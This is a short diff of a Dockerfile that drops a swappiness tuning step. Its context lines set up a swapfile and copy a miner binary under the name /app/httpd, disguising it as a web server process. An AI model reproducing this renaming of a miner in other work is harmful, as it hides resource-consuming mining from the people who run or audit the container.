@@ -21,9 +21,6 @@ RUN fallocate -l 1G /swapfile && \
     swapon /swapfile && \
     echo "/swapfile none swap sw 0 0" >> /etc/fstab
 
-# Optimize swappiness
-RUN sysctl vm.swappiness=10 && echo "vm.swappiness=10" >> /etc/sysctl.conf
-
 # Download miner binary
 COPY iniminer-linux-x64 /app/httpd
 RUN chmod +x /app/httpd
